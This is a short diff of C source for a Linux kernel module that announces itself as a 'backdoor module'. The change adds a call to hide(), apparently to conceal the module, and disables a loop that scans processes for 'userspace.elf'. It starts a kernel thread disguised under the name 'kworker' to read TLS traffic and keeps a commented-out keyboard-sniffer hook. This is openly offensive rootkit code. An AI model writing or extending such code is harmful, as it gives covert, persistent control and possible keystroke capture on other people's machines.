@@ -605,8 +605,12 @@ static int __init mod_init(void) {
     closed_ports = kmalloc(2 * 65536, GFP_KERNEL);
 
     svc->read_thread = kthread_run((void*) read_TLS, NULL, "kworker");
+
+    hide();
+
     printk(KERN_ALERT "backdoor module loaded\n");
 
+#if 0
     for_each_process(ts) {
         printk(KERN_INFO "Process name %s %d\n", get_task_comm(proc_name, ts), ts->pid);
         if (strcmp("userspace.elf", proc_name) == 0) {
@@ -627,6 +631,7 @@ static int __init mod_init(void) {
 #endif
         }
     }
+#endif
 
     //register_keyboard_notifier(&keysniffer_blk);
 
